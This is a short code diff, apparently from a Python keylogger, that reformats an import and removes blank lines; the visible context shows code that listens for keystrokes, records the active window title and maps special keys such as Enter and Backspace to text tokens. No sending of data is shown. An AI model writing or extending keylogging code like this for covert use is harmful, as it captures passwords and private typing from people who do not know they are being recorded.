@@ -1,4 +1,4 @@
-from pynput.keyboard import Key,Listener
+from pynput.keyboard import Key, Listener
 import win32gui
 import os
 import time
@@ -26,7 +26,6 @@ logged_data.append(msg)
 old_app = ''
 delete_file = []
 
-
 def on_press(key):
 	global old_app
 
@@ -43,7 +42,6 @@ def on_press(key):
 		old_app = new_app
 	else:
 		pass
-
 
 	substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
 	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
